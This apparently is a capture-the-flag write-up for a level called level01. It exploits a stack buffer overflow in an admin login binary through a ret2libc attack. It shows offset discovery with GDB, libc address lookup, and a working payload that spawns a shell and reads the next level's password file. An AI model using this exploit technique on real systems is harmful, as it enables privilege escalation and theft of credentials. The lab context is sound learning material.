# Level 01

- Here we find a program that first asks for a user and then for a password.
- But it only passes to the password if the user is correct.
- By decompiling the program or using the `strings` command, we find that the user is `dat_wil` and a certain password `admin` which is never used.
- By testing, we realize that when we enter the right user but a password too long, the program crashes.
- We can try to make a ret2libc.

```console
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...

Segmentation fault (core dumped)
```

- With GDB and my `pattern.py`, we can find the offset for our injection.

```console
$ python3 pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```gdb
(gdb) r < <(echo "dat_will"; echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
Starting program: /home/users/level01/level01 < <(echo "dat_will"; echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

$ python3 pattern.py --crash 37634136
Buffer crashed at size: 80
```

- We have our offset, let's find the addresses we're interested in: `system`, `exit` and `"/bin/sh"`.

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find system, +9999999, "/bin/sh"
0xf7f897ec
```

- Let's write our exploit:

[ OFFSET ] [ SYSTEM ADDR ] [ EXIT ADDR ] [ ARG ADDR ]

```console
$ (echo dat_wil; python -c 'print("A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
```
